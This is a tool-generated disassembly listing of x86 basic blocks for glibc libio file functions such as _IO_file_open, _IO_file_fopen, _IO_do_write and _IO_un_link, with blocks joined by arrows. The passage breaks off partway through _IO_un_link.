0xb06f4e3:	mov	dword ptr [esi + 0xc], 0
0xb06f4ea:	mov	dword ptr [esi + 4], 0
0xb06f4f1:	mov	dword ptr [esi + 8], 0
0xb06f4f8:	mov	dword ptr [esi + 0x14], 0
0xb06f4ff:	mov	dword ptr [esi + 0x10], 0
0xb06f506:	mov	dword ptr [esi + 0x18], 0
0xb06f50d:	mov	dword ptr [esp], esi
0xb06f510:	call	0xb0701b0
None
|
|
|
v
0xb06f57d:	mov	ebp, eax
0xb06f57f:	jmp	0xb06f44a
None
|
|
|
v
0xb06f46f:	mov	dword ptr [esp], esi
0xb06f472:	call	0xb06a5d0
None
|
|
|
v
0xb06f515:	test	edi, edi
0xb06f517:	mov	eax, edi
0xb06f519:	mov	dword ptr [esi], 0xfbad240c
0xb06f51f:	cmove	eax, ebp
0xb06f522:	mov	dword ptr [esi + 0x38], 0xffffffff
0xb06f529:	mov	dword ptr [esi + 0x4c], 0xffffffff
0xb06f530:	mov	dword ptr [esi + 0x50], 0xffffffff
0xb06f537:	add	esp, 0x10
0xb06f53a:	pop	esi
0xb06f53b:	pop	edi
0xb06f53c:	pop	ebp
0xb06f53d:	ret	
None
|
|
|
v
0xb06f497:	mov	eax, dword ptr [esi + 0x58]
0xb06f49a:	mov	dword ptr [eax + 8], 0
0xb06f4a1:	mov	dword ptr [eax], 0
0xb06f4a7:	mov	dword ptr [eax + 4], 0
0xb06f4ae:	mov	dword ptr [eax + 0x10], 0
0xb06f4b5:	mov	dword ptr [eax + 0xc], 0
0xb06f4bc:	mov	dword ptr [eax + 0x14], 0
0xb06f4c3:	mov	dword ptr [esp + 0xc], 0
0xb06f4cb:	mov	dword ptr [esp + 8], 0
0xb06f4d3:	mov	dword ptr [esp + 4], 0
0xb06f4db:	mov	dword ptr [esp], esi
0xb06f4de:	call	0xb070bd0
None
|
|
|
v
0xb06f477:	mov	dword ptr [esp + 0xc], 0
0xb06f47f:	mov	dword ptr [esp + 8], 0
0xb06f487:	mov	dword ptr [esp + 4], 0
0xb06f48f:	mov	dword ptr [esp], esi
0xb06f492:	call	0xb06a050
None
|
|
|
v
0xb06f55f:	mov	edx, dword ptr [esi + 0x58]
0xb06f562:	mov	eax, dword ptr [edx + 0xc]
0xb06f565:	mov	edx, dword ptr [edx + 0x10]
0xb06f568:	mov	dword ptr [esp], esi
0xb06f56b:	mov	dword ptr [esp + 4], eax
0xb06f56f:	sub	edx, eax
0xb06f571:	sar	edx, 2
0xb06f574:	mov	dword ptr [esp + 8], edx
0xb06f578:	call	0xb06c400
None
|
|
|
v
0xb06f45e:	mov	edx, dword ptr [esi + 0x68]
0xb06f461:	test	edx, edx
0xb06f463:	jle	0xb06f4c3
None
|
|
|
v
0xb06f537:	add	esp, 0x10
0xb06f53a:	pop	esi
0xb06f53b:	pop	edi
0xb06f53c:	pop	ebp
0xb06f53d:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:_IO_file_open
TOTAL BLOCKS :17
0xb06f6d0:	movsx	eax, byte ptr [esi + 0x46]
0xb06f6d4:	mov	eax, dword ptr [esi + eax + 0x94]
0xb06f6db:	mov	dword ptr [esp + 0x10], 3
0xb06f6e3:	mov	dword ptr [esp + 0xc], 2
0xb06f6eb:	mov	dword ptr [esp + 4], 0
0xb06f6f3:	mov	dword ptr [esp + 8], 0
0xb06f6fb:	mov	dword ptr [esp], esi
0xb06f6fe:	call	dword ptr [eax + 0x24]
None
|
|
|
v
0xb06f701:	and	eax, edx
0xb06f703:	cmp	eax, 0xff
0xb06f706:	jne	0xb06f6ba
None
|
|
|
v
0xb06f67c:	or	eax, dword ptr [esp + 0x48]
0xb06f680:	mov	dword ptr [esp], edx
0xb06f683:	mov	dword ptr [esp + 4], eax
0xb06f687:	call	0xb0daad0
None
|
|
|
v
0xb06f72c:	or	eax, dword ptr [esp + 0x48]
0xb06f730:	mov	dword ptr [esp], edx
0xb06f733:	mov	dword ptr [esp + 4], eax
0xb06f737:	call	0xb0daada
None
|
|
|
v
0xb06f6c4:	add	esp, 0x2c
0xb06f6c7:	pop	ebx
0xb06f6c8:	pop	esi
0xb06f6c9:	pop	edi
0xb06f6ca:	pop	ebp
0xb06f6cb:	ret	
None
|
|
|
v
0xb06f6ba:	mov	dword ptr [esp], esi
0xb06f6bd:	call	0xb0703d0
None
|
|
|
v
0xb06f640:	push	ebp
0xb06f641:	push	edi
0xb06f642:	push	esi
0xb06f643:	push	ebx
0xb06f644:	sub	esp, 0x2c
0xb06f647:	call	0xb1267db
None
|
|
|
v
0xb06f696:	mov	eax, dword ptr [esi]
0xb06f698:	mov	edx, edi
0xb06f69a:	and	edi, 0x1004
0xb06f6a0:	and	edx, 0x100c
0xb06f6a6:	mov	dword ptr [esi + 0x38], ebp
0xb06f6a9:	and	eax, 0xffffeff3
0xb06f6ae:	or	eax, edx
0xb06f6b0:	cmp	edi, 0x1004
0xb06f6b6:	mov	dword ptr [esi], eax
0xb06f6b8:	je	0xb06f6d0
None
|
|
|
v
0xb06f708:	mov	eax, dword ptr [ebx - 0xdc]
0xb06f70e:	mov	edx, dword ptr gs:[0]
0xb06f715:	cmp	dword ptr [edx + eax], 0x1d
0xb06f719:	je	0xb06f6ba
None
|
|
|
v
0xb06f64c:	add	ebx, 0x13b9b4
0xb06f652:	mov	esi, dword ptr [esp + 0x40]
0xb06f656:	cmp	dword ptr [esp + 0x54], 1
0xb06f65b:	mov	ecx, dword ptr [esp + 0x4c]
0xb06f65f:	mov	edx, dword ptr [esp + 0x44]
0xb06f663:	sbb	eax, eax
0xb06f665:	mov	edi, dword ptr [esp + 0x50]
0xb06f669:	and	eax, 0x8000
0xb06f66e:	test	byte ptr [esi + 0x3c], 2
0xb06f672:	mov	dword ptr [esp + 8], ecx
0xb06f676:	jne	0xb06f72c
None
|
|
|
v
0xb06f71b:	mov	dword ptr [esp], ebp
0xb06f71e:	call	0xb0db86a
None
|
|
|
v
0xb06f68c:	mov	ebp, eax
0xb06f68e:	test	ebp, ebp
0xb06f690:	js	0xb06f728
None
|
|
|
v
0xb06f73c:	mov	ebp, eax
0xb06f73e:	jmp	0xb06f68e
None
|
|
|
v
0xb06f6c2:	mov	eax, esi
0xb06f6c4:	add	esp, 0x2c
0xb06f6c7:	pop	ebx
0xb06f6c8:	pop	esi
0xb06f6c9:	pop	edi
0xb06f6ca:	pop	ebp
0xb06f6cb:	ret	
None
|
|
|
v
0xb06f723:	xor	eax, eax
0xb06f725:	jmp	0xb06f6c4
None
|
|
|
v
0xb06f68e:	test	ebp, ebp
0xb06f690:	js	0xb06f728
None
|
|
|
v
0xb06f728:	xor	eax, eax
0xb06f72a:	jmp	0xb06f6c4
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:_IO_file_fopen
TOTAL BLOCKS :73
0xb06f77c:	cmp	dl, 0x77
0xb06f77f:	je	0xb06f7e0
None
|
|
|
v
0xb06fbec:	lea	esi, dword ptr [esi]
0xb06fbf0:	push	ebp
0xb06fbf1:	push	edi
0xb06fbf2:	push	esi
0xb06fbf3:	push	ebx
0xb06fbf4:	sub	esp, 0x2c
0xb06fbf7:	mov	esi, dword ptr [esp + 0x40]
0xb06fbfb:	call	0xb1267db
None
|
|
|
v
0xb06fb60:	mov	dword ptr [ebp - 0x30], 8
0xb06fb67:	xor	edi, edi
0xb06fb69:	mov	dword ptr [ebp - 0x2c], 0
0xb06fb70:	jmp	0xb06f7f3
None
|
|
|
v
0xb06fc77:	mov	eax, dword ptr [ebx - 0xdc]
0xb06fc7d:	mov	dword ptr [edi + eax], ebp
0xb06fc80:	add	esp, 0x2c
0xb06fc83:	mov	eax, esi
0xb06fc85:	pop	ebx
0xb06fc86:	pop	esi
0xb06fc87:	pop	edi
0xb06fc88:	pop	ebp
0xb06fc89:	ret	
None
|
|
|
v
0xb06f910:	movsx	edx, al
0xb06f913:	test	byte ptr [edi + edx*2], 8
0xb06f917:	je	0xb06f8e8
None
|
|
|
v
0xb06fa0b:	rep movsd	dword ptr es:[edi], dword ptr [esi]
None
|
|
|
v
0xb06f90a:	lea	esi, dword ptr [esi]
None
|
|
|
v
0xb06f7e0:	mov	dword ptr [ebp - 0x30], 4
0xb06f7e7:	mov	edi, 0x240
0xb06f7ec:	mov	dword ptr [ebp - 0x2c], 1
0xb06f7f3:	lea	ecx, dword ptr [eax + 6]
0xb06f7f6:	mov	esi, eax
0xb06f7f8:	add	eax, 1
0xb06f7fb:	movzx	edx, byte ptr [eax]
0xb06f7fe:	cmp	dl, 0x63
0xb06f801:	je	0xb06fb18
None
|
|
|
v
0xb06f816:	cmp	dl, 0x62
0xb06f819:	je	0xb06fae6
None
|
|
|
v
0xb06fc00:	add	ebx, 0x13b400
0xb06fc06:	cmp	dword ptr [esi + 0x38], -1
0xb06fc0a:	jne	0xb06fca0
None
|
|
|
v
0xb06f9af:	cmp	dword ptr [ebp - 0x1c], 1
0xb06f9b3:	jne	0xb06fbc2
None
|
|
|
v
0xb06fae6:	mov	esi, eax
0xb06fae8:	jmp	0xb06f828
None
|
|
|
v
0xb06f945:	lea	esi, dword ptr [edx - 2]
0xb06f948:	lea	eax, dword ptr [ecx + 1]
0xb06f94b:	sub	esi, ecx
0xb06f94d:	lea	esi, dword ptr [esi]
0xb06f950:	mov	byte ptr [eax - 1], 0x2f
0xb06f954:	mov	ecx, eax
0xb06f956:	add	eax, 1
0xb06f959:	lea	edx, dword ptr [esi + eax]
0xb06f95c:	cmp	edx, 1
0xb06f95f:	jle	0xb06f950
None
|
|
|
v
0xb06f8f4:	cmp	al, 0x3a
0xb06f8f6:	je	0xb06f919
None
|
|
|
v
0xb06fabd:	cmp	dl, 0x78
0xb06fac0:	je	0xb06fae0
None
|
|
|
v
0xb06f828:	cmp	eax, ecx
0xb06f82a:	jne	0xb06f7f8
None
|
|
|
v
0xb06f78a:	mov	eax, dword ptr [ebx - 0xdc]
0xb06f790:	mov	edx, dword ptr gs:[0]
0xb06f797:	mov	dword ptr [edx + eax], 0x16
0xb06f79e:	lea	esp, dword ptr [ebp - 0xc]
0xb06f7a1:	xor	eax, eax
0xb06f7a3:	pop	ebx
0xb06f7a4:	pop	esi
0xb06f7a5:	pop	edi
0xb06f7a6:	pop	ebp
0xb06f7a7:	ret	
None
|
|
|
v
0xb06f919:	mov	eax, dword ptr [ebx - 0xf84]
0xb06f91f:	add	esi, 1
0xb06f922:	mov	ecx, dword ptr [ebp - 0x2c]
0xb06f925:	mov	eax, dword ptr [eax + edx*4]
0xb06f928:	mov	byte ptr [ecx], al
0xb06f92a:	lea	eax, dword ptr [ecx + 1]
0xb06f92d:	mov	dword ptr [ebp - 0x2c], eax
0xb06f930:	movzx	eax, byte ptr [esi]
0xb06f933:	test	al, al
0xb06f935:	jne	0xb06f910
None
|
|
|
v
0xb06f99d:	test	eax, eax
0xb06f99f:	jne	0xb06f7a8
None
|
|
|
v
0xb06f7b3:	mov	eax, dword ptr [ebx - 0xdc]
0xb06f7b9:	mov	edx, dword ptr gs:[0]
0xb06f7c0:	mov	dword ptr [edx + eax], 0x16
0xb06f7c7:	mov	esp, dword ptr [ebp - 0x3c]
0xb06f7ca:	lea	esi, dword ptr [esi]
0xb06f7d0:	lea	esp, dword ptr [ebp - 0xc]
0xb06f7d3:	xor	eax, eax
0xb06f7d5:	pop	ebx
0xb06f7d6:	pop	esi
0xb06f7d7:	pop	edi
0xb06f7d8:	pop	ebp
0xb06f7d9:	ret	
None
|
|
|
v
0xb06f807:	jg	0xb06fab8
None
|
|
|
v
0xb06f96d:	mov	ecx, dword ptr [ebx - 0xf84]
0xb06f973:	xor	eax, eax
0xb06f975:	mov	esi, dword ptr [ebp - 0x40]
0xb06f978:	mov	edi, dword ptr [ebp - 0x30]
0xb06f97b:	nop	
0xb06f97c:	lea	esi, dword ptr [esi]
0xb06f980:	movsx	edx, byte ptr [esi + eax + 5]
0xb06f985:	mov	edx, dword ptr [ecx + edx*4]
0xb06f988:	mov	byte ptr [edi + eax], dl
0xb06f98b:	add	eax, 1
0xb06f98e:	test	dl, dl
0xb06f990:	jne	0xb06f980
None
|
|
|
v
0xb06f7f8:	add	eax, 1
0xb06f7fb:	movzx	edx, byte ptr [eax]
0xb06f7fe:	cmp	dl, 0x63
0xb06f801:	je	0xb06fb18
None
|
|
|
v
0xb06fb98:	lea	eax, dword ptr [ebx - 0x49897]
0xb06fb9e:	mov	dword ptr [esp + 0xc], eax
0xb06fba2:	lea	eax, dword ptr [ebx - 0x498d7]
0xb06fba8:	mov	dword ptr [esp + 4], eax
0xb06fbac:	lea	eax, dword ptr [ebx - 0x499e9]
0xb06fbb2:	mov	dword ptr [esp + 8], 0x17a
0xb06fbba:	mov	dword ptr [esp], eax
0xb06fbbd:	call	0xb027820
None
|
|
|
v
0xb06fc90:	mov	eax, dword ptr [ebx - 0xdc]
0xb06fc96:	cmp	dword ptr [edi + eax], 0x1d
0xb06fc9a:	je	0xb06fc77
None
|
|
|
v
0xb06fca0:	add	esp, 0x2c
0xb06fca3:	xor	eax, eax
0xb06fca5:	pop	ebx
0xb06fca6:	pop	esi
0xb06fca7:	pop	edi
0xb06fca8:	pop	ebp
0xb06fca9:	ret	
None
|
|
|
v
0xb06fa0d:	mov	edi, dword ptr [ebp - 0x34]
0xb06fa10:	mov	dword ptr [edx + 0x70], 0
0xb06fa17:	mov	dword ptr [edx + 0x5c], eax
0xb06fa1a:	mov	eax, dword ptr [ebp - 0x28]
0xb06fa1d:	mov	dword ptr [edx + 0x74], 1
0xb06fa24:	mov	dword ptr [edx + 0x6c], 1
0xb06fa2b:	mov	dword ptr [edx + 0x60], eax
0xb06fa2e:	mov	eax, dword ptr [edi + 0x58]
0xb06fa31:	mov	dword ptr [edx + 0x84], 0
0xb06fa3b:	add	eax, 0x2c
0xb06fa3e:	mov	dword ptr [edx + 0x78], eax
0xb06fa41:	mov	eax, dword ptr [ebp - 0x1c]
0xb06fa44:	mov	dword ptr [edx + 0x88], eax
0xb06fa4a:	mov	eax, dword ptr [ebp - 0x20]
0xb06fa4d:	mov	dword ptr [edx + 0x8c], eax
0xb06fa53:	mov	dword ptr [edx + 0x9c], 0
0xb06fa5d:	mov	ecx, dword ptr [ebp + 8]
0xb06fa60:	mov	dword ptr [edx + 0xa0], 1
0xb06fa6a:	mov	dword ptr [edx + 0x98], 1
0xb06fa74:	mov	eax, dword ptr [edi + 0x58]
0xb06fa77:	mov	dword ptr [ebp - 0x2c], eax
0xb06fa7a:	add	eax, 0x2c
0xb06fa7d:	mov	dword ptr [edx + 0xa4], eax
0xb06fa83:	lea	eax, dword ptr [ebx - 0x9ac]
0xb06fa89:	mov	dword ptr [edx + 0xb0], eax
0xb06fa8f:	mov	eax, dword ptr [ebp + 8]
0xb06fa92:	mov	eax, dword ptr [eax + 0x58]
0xb06fa95:	mov	eax, dword ptr [eax + 0xb8]
0xb06fa9b:	mov	dword ptr [ecx + 0x94], eax
0xb06faa1:	mov	eax, edi
0xb06faa3:	mov	dword ptr [edi + 0x68], 1
0xb06faaa:	mov	esp, dword ptr [ebp - 0x3c]
0xb06faad:	lea	esp, dword ptr [ebp - 0xc]
0xb06fab0:	pop	ebx
0xb06fab1:	pop	esi
0xb06fab2:	pop	edi
0xb06fab3:	pop	ebp
0xb06fab4:	ret	
None
|
|
|
v
0xb06f886:	lea	esi, dword ptr [eax + 5]
0xb06f889:	mov	dword ptr [ebp - 0x3c], esp
0xb06f88c:	mov	dword ptr [esp + 4], 0x2c
0xb06f894:	mov	dword ptr [esp], esi
0xb06f897:	call	0xb07ee30
None
|
|
|
v
0xb06f89c:	sub	eax, esi
0xb06f89e:	lea	edx, dword ptr [eax + 0x12]
0xb06f8a1:	and	edx, 0xfffffff0
0xb06f8a4:	sub	esp, edx
0xb06f8a6:	lea	edi, dword ptr [esp + 0x18]
0xb06f8aa:	mov	dword ptr [ebp - 0x30], edi
0xb06f8ad:	mov	dword ptr [esp + 8], eax
0xb06f8b1:	mov	dword ptr [esp + 4], esi
0xb06f8b5:	mov	dword ptr [esp], edi
0xb06f8b8:	call	0xb07cad0
None
|
|
|
v
0xb06fb78:	mov	eax, dword ptr [ebp - 0x34]
0xb06fb7b:	lea	esp, dword ptr [ebp - 0xc]
0xb06fb7e:	pop	ebx
0xb06fb7f:	pop	esi
0xb06fb80:	pop	edi
0xb06fb81:	pop	ebp
0xb06fb82:	ret	
None
|
|
|
v
0xb06f8ec:	lea	ecx, dword ptr [eax - 0x2c]
0xb06f8ef:	cmp	cl, 2
0xb06f8f2:	jbe	0xb06f919
None
|
|
|
v
0xb06f7f3:	lea	ecx, dword ptr [eax + 6]
0xb06f7f6:	mov	esi, eax
0xb06f7f8:	add	eax, 1
0xb06f7fb:	movzx	edx, byte ptr [eax]
0xb06f7fe:	cmp	dl, 0x63
0xb06f801:	je	0xb06fb18
None
|
|
|
v
0xb06f770:	movzx	edx, byte ptr [eax]
0xb06f773:	cmp	dl, 0x72
0xb06f776:	je	0xb06fb60
None
|
|
|
v
0xb06f950:	mov	byte ptr [eax - 1], 0x2f
0xb06f954:	mov	ecx, eax
0xb06f956:	add	eax, 1
0xb06f959:	lea	edx, dword ptr [esi + eax]
0xb06f95c:	cmp	edx, 1
0xb06f95f:	jle	0xb06f950
None
|
|
|
v
0xb06f9a5:	cmp	dword ptr [ebp - 0x24], 1
0xb06f9a9:	jne	0xb06fb98
None
|
|
|
v
0xb06fc70:	and	eax, edx
0xb06fc72:	cmp	eax, 0xff
0xb06fc75:	je	0xb06fc90
None
|
|
|
v
0xb06f961:	mov	eax, dword ptr [ebp - 0x30]
0xb06f964:	mov	byte ptr [ecx], 0
0xb06f967:	cmp	byte ptr [eax + 2], 0
0xb06f96b:	jne	0xb06f992
None
|
|
|
v
0xb06fb83:	mov	ecx, dword ptr [ebp - 0x30]
0xb06fb86:	mov	edx, 1
0xb06fb8b:	jmp	0xb06f945
None
|
|
|
v
0xb06f81f:	test	dl, dl
0xb06f821:	je	0xb06f82c
None
|
|
|
v
0xb06fae0:	or	edi, 0x80
0xb06fae6:	mov	esi, eax
0xb06fae8:	jmp	0xb06f828
None
|
|
|
v
0xb06fbc2:	lea	eax, dword ptr [ebx - 0x49897]
0xb06fbc8:	mov	dword ptr [esp + 0xc], eax
0xb06fbcc:	lea	eax, dword ptr [ebx - 0x498d7]
0xb06fbd2:	mov	dword ptr [esp + 4], eax
0xb06fbd6:	lea	eax, dword ptr [ebx - 0x499d3]
0xb06fbdc:	mov	dword ptr [esp + 8], 0x17b
0xb06fbe4:	mov	dword ptr [esp], eax
0xb06fbe7:	call	0xb027820
None
|
|
|
v
0xb06fab8:	cmp	dl, 0x6d
0xb06fabb:	je	0xb06fb08
None
|
|
|
v
0xb06f980:	movsx	edx, byte ptr [esi + eax + 5]
0xb06f985:	mov	edx, dword ptr [ecx + edx*4]
0xb06f988:	mov	byte ptr [edi + eax], dl
0xb06f98b:	add	eax, 1
0xb06f98e:	test	dl, dl
0xb06f990:	jne	0xb06f980
None
|
|
|
v
0xb06fb28:	add	dword ptr [ebp - 0x38], 1
0xb06fb2c:	cmp	dword ptr [ebp - 0x38], 3
0xb06fb30:	je	0xb06fb90
None
|
|
|
v
0xb06f8cd:	mov	ecx, dword ptr [ebp - 0x30]
0xb06f8d0:	mov	edi, dword ptr [ebx - 0xf8c]
0xb06f8d6:	mov	dword ptr [ebp - 0x38], 0
0xb06f8dd:	mov	esi, ecx
0xb06f8df:	mov	dword ptr [ebp - 0x2c], ecx
0xb06f8e2:	jmp	0xb06f910
None
|
|
|
v
0xb06f781:	cmp	dl, 0x61
0xb06f784:	je	0xb06fb48
None
|
|
|
v
0xb06f9b9:	mov	eax, dword ptr [ebp + 8]
0xb06f9bc:	lea	esi, dword ptr [ebx - 0x1860]
0xb06f9c2:	mov	ecx, dword ptr [ebp + 8]
0xb06f9c5:	mov	eax, dword ptr [eax + 0x58]
0xb06f9c8:	mov	edx, dword ptr [eax + 4]
0xb06f9cb:	mov	dword ptr [eax + 0x2c], 0
0xb06f9d2:	mov	dword ptr [eax + 0x30], 0
0xb06f9d9:	mov	dword ptr [eax], edx
0xb06f9db:	mov	edx, dword ptr [eax + 0xc]
0xb06f9de:	mov	dword ptr [eax + 0x10], edx
0xb06f9e1:	mov	eax, dword ptr [ebp + 8]
0xb06f9e4:	mov	eax, dword ptr [eax + 0x58]
0xb06f9e7:	mov	dword ptr [eax + 0x34], 0
0xb06f9ee:	mov	dword ptr [eax + 0x38], 0
0xb06f9f5:	mov	eax, dword ptr [ebp + 8]
0xb06f9f8:	mov	edx, dword ptr [eax + 0x58]
0xb06f9fb:	lea	eax, dword ptr [edx + 0x3c]
0xb06f9fe:	mov	dword ptr [ecx + 0x54], eax
0xb06fa01:	mov	edi, eax
0xb06fa03:	mov	eax, dword ptr [ebp - 0x24]
0xb06fa06:	mov	ecx, 0x1e
0xb06fa0b:	rep movsd	dword ptr es:[edi], dword ptr [esi]
None
|
|
|
v
0xb06f8e8:	cmp	al, 0x5f
0xb06f8ea:	je	0xb06f919
None
|
|
|
v
0xb06f750:	push	ebp
0xb06f751:	mov	ebp, esp
0xb06f753:	push	edi
0xb06f754:	push	esi
0xb06f755:	push	ebx
0xb06f756:	sub	esp, 0x4c
0xb06f759:	mov	edi, dword ptr [ebp + 8]
0xb06f75c:	call	0xb1267db
None
|
|
|
v
0xb06f8f8:	cmp	al, 0x2f
0xb06f8fa:	je	0xb06fb28
None
|
|
|
v
0xb06f82c:	mov	eax, dword ptr [ebp + 0x14]
0xb06f82f:	mov	dword ptr [esp + 0x14], eax
0xb06f833:	mov	eax, dword ptr [ebp - 0x30]
0xb06f836:	mov	dword ptr [esp + 0xc], 0x1b6
0xb06f83e:	mov	dword ptr [esp + 0x10], eax
0xb06f842:	or	edi, dword ptr [ebp - 0x2c]
0xb06f845:	mov	dword ptr [esp + 8], edi
0xb06f849:	mov	eax, dword ptr [ebp + 0xc]
0xb06f84c:	mov	dword ptr [esp + 4], eax
0xb06f850:	mov	eax, dword ptr [ebp + 8]
0xb06f853:	mov	dword ptr [esp], eax
0xb06f856:	call	0xb06f640
None
|
|
|
v
0xb06fb48:	mov	dword ptr [ebp - 0x30], 0x1004
0xb06fb4f:	mov	edi, 0x440
0xb06fb54:	mov	dword ptr [ebp - 0x2c], 1
0xb06fb5b:	jmp	0xb06f7f3
None
|
|
|
v
0xb06f900:	add	esi, 1
0xb06f903:	movzx	eax, byte ptr [esi]
0xb06f906:	test	al, al
0xb06f908:	je	0xb06f937
None
|
|
|
v
0xb06f7d0:	lea	esp, dword ptr [ebp - 0xc]
0xb06f7d3:	xor	eax, eax
0xb06f7d5:	pop	ebx
0xb06f7d6:	pop	esi
0xb06f7d7:	pop	edi
0xb06f7d8:	pop	ebp
0xb06f7d9:	ret	
None
|
|
|
v
0xb06fac2:	cmp	dl, 0x65
0xb06fac5:	jne	0xb06f828
None
|
|
|
v
0xb06fb08:	mov	edx, dword ptr [ebp + 8]
0xb06fb0b:	or	dword ptr [edx + 0x3c], 1
0xb06fb0f:	jmp	0xb06f828
None
|
|
|
v
0xb06fc9c:	lea	esi, dword ptr [esi]
None
|
|
|
v
0xb06f7a8:	mov	eax, dword ptr [ebp + 8]
0xb06f7ab:	mov	dword ptr [esp], eax
0xb06f7ae:	call	0xb06f420
None
|
|
|
v
0xb06fb90:	mov	ecx, dword ptr [ebp - 0x2c]
0xb06fb93:	jmp	0xb06f961
None
|
|
|
v
0xb06f866:	lea	eax, dword ptr [ebx - 0x4989d]
0xb06f86c:	add	esi, 1
0xb06f86f:	mov	dword ptr [esp + 4], eax
0xb06f873:	mov	dword ptr [esp], esi
0xb06f876:	call	0xb07bcc0
None
|
|
|
v
0xb06f761:	add	ebx, 0x13b89f
0xb06f767:	mov	eax, dword ptr [ebp + 0x10]
0xb06f76a:	cmp	dword ptr [edi + 0x38], -1
0xb06f76e:	jne	0xb06f7d0
None
|
|
|
v
0xb06fb32:	mov	eax, dword ptr [ebp - 0x2c]
0xb06fb35:	mov	byte ptr [eax], 0x2f
0xb06fb38:	add	eax, 1
0xb06fb3b:	mov	dword ptr [ebp - 0x2c], eax
0xb06fb3e:	jmp	0xb06f900
None
|
|
|
v
0xb06f937:	mov	eax, dword ptr [ebp - 0x38]
0xb06f93a:	mov	ecx, dword ptr [ebp - 0x2c]
0xb06f93d:	cmp	eax, 1
0xb06f940:	lea	edx, dword ptr [eax + 1]
0xb06f943:	jg	0xb06f961
None
|
|
|
v
0xb06fc10:	mov	eax, dword ptr [esp + 0x44]
0xb06fc14:	mov	edi, dword ptr gs:[0]
0xb06fc1b:	mov	dword ptr [esi + 0x4c], 0xffffffff
0xb06fc22:	mov	dword ptr [esi + 0x50], 0xffffffff
0xb06fc29:	mov	dword ptr [esi + 0x38], eax
0xb06fc2c:	mov	eax, dword ptr [esi]
0xb06fc2e:	and	eax, 0xfffffff3
0xb06fc31:	or	eax, 0x40
0xb06fc34:	mov	dword ptr [esi], eax
0xb06fc36:	mov	eax, dword ptr [ebx - 0xdc]
0xb06fc3c:	mov	ebp, dword ptr [edi + eax]
0xb06fc3f:	movsx	eax, byte ptr [esi + 0x46]
0xb06fc43:	mov	eax, dword ptr [esi + eax + 0x94]
0xb06fc4a:	mov	dword ptr [esp + 0x10], 3
0xb06fc52:	mov	dword ptr [esp + 0xc], 1
0xb06fc5a:	mov	dword ptr [esp + 4], 0
0xb06fc62:	mov	dword ptr [esp + 8], 0
0xb06fc6a:	mov	dword ptr [esp], esi
0xb06fc6d:	call	dword ptr [eax + 0x24]
None
|
|
|
v
0xb06faf0:	and	dword ptr [ebp - 0x30], 0x1000
0xb06faf7:	mov	esi, eax
0xb06faf9:	mov	dword ptr [ebp - 0x2c], 2
0xb06fb00:	jmp	0xb06f828
None
|
|
|
v
0xb06f87b:	test	eax, eax
0xb06f87d:	mov	dword ptr [ebp - 0x40], eax
0xb06f880:	je	0xb06fb78
None
|
|
|
v
0xb06fb18:	mov	edx, dword ptr [ebp + 8]
0xb06fb1b:	or	dword ptr [edx + 0x3c], 2
0xb06fb1f:	jmp	0xb06f828
None
|
|
|
v
0xb06f80d:	cmp	dl, 0x2b
0xb06f810:	je	0xb06faf0
None
|
|
|
v
0xb06facb:	mov	edx, dword ptr [ebp + 8]
0xb06face:	or	edi, 0x80000
0xb06fad4:	or	dword ptr [edx + 0x3c], 0x40
0xb06fad8:	jmp	0xb06f828
None
|
|
|
v
0xb06f823:	nop	
0xb06f824:	lea	esi, dword ptr [esi]
None
|
|
|
v
0xb06f992:	mov	edx, dword ptr [ebp - 0x30]
0xb06f995:	lea	eax, dword ptr [ebp - 0x28]
0xb06f998:	call	0xb0a3f60
None
|
|
|
v
0xb06f8bd:	mov	byte ptr [eax], 0
0xb06f8c0:	movzx	eax, byte ptr [esp + 0x18]
0xb06f8c5:	test	al, al
0xb06f8c7:	je	0xb06fb83
None
|
|
|
v
0xb06f85b:	test	eax, eax
0xb06f85d:	mov	dword ptr [ebp - 0x34], eax
0xb06f860:	je	0xb06f7d0
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:_IO_do_write
TOTAL BLOCKS :4
0xb06fcb0:	push	esi
0xb06fcb1:	xor	eax, eax
0xb06fcb3:	sub	esp, 0x18
0xb06fcb6:	mov	esi, dword ptr [esp + 0x28]
0xb06fcba:	test	esi, esi
0xb06fcbc:	je	0xb06fcd8
None
|
|
|
v
0xb06fcd8:	add	esp, 0x18
0xb06fcdb:	pop	esi
0xb06fcdc:	ret	
None
|
|
|
v
0xb06fcbe:	mov	edx, dword ptr [esp + 0x24]
0xb06fcc2:	mov	eax, dword ptr [esp + 0x20]
0xb06fcc6:	mov	dword ptr [esp], esi
0xb06fcc9:	call	0xb06df20
None
|
|
|
v
0xb06fcce:	cmp	esi, eax
0xb06fcd0:	setne	al
0xb06fcd3:	movzx	eax, al
0xb06fcd6:	neg	eax
0xb06fcd8:	add	esp, 0x18
0xb06fcdb:	pop	esi
0xb06fcdc:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:_IO_un_link
TOTAL BLOCKS :50
0xb070370:	mov	dword ptr [edx + 8], 0
0xb070377:	cmp	dword ptr gs:[0xc], 0
0xb07037f:	je	0xb070382
None
|
|
|
v
0xb070279:	mov	edx, dword ptr [ebx + 0x940]
0xb07027f:	test	edx, edx
0xb070281:	je	0xb0702b2
None
|
|
|
v
0xb070304:	add	esp, 0x2c
0xb070307:	pop	ebx
0xb070308:	pop	esi
0xb070309:	pop	edi
0xb07030a:	pop	ebp
0xb07030b:	ret	
None
|
|
|
v
0xb070263:	mov	eax, dword ptr [esi + 0x48]
0xb070266:	mov	edx, dword ptr [esi + 0x48]
0xb070269:	mov	dword ptr [eax + 8], ebp
0xb07026c:	mov	ebp, dword ptr [esi]
0xb07026e:	add	dword ptr [edx + 4], 1
0xb070272:	mov	eax, ebp
0xb070274:	and	eax, 0x8000
0xb070279:	mov	edx, dword ptr [ebx + 0x940]
0xb07027f:	test	edx, edx
0xb070281:	je	0xb0702b2
None
|
|
|
v
0xb0702de:	mov	dword ptr [ebx + 0x1888], 0
0xb0702e8:	cmp	dword ptr gs:[0xc], 0
0xb0702f0:	je	0xb0702f3
None
|
|
|
v
0xb071da2:	lea	eax, dword ptr [ebx + 0x1880]
0xb071da8:	call	0xb0f9460
None
|
|
|
v
0xb070292:	cmp	esi, ecx
0xb070294:	jne	0xb0702aa
None
|
|
|
v
0xb071db2:	lea	eax, dword ptr [edx]
0xb071db4:	call	0xb0f9460
None
|
|
|
v
0xb0701dd:	lea	eax, dword ptr [ebx - 0x13aec0]
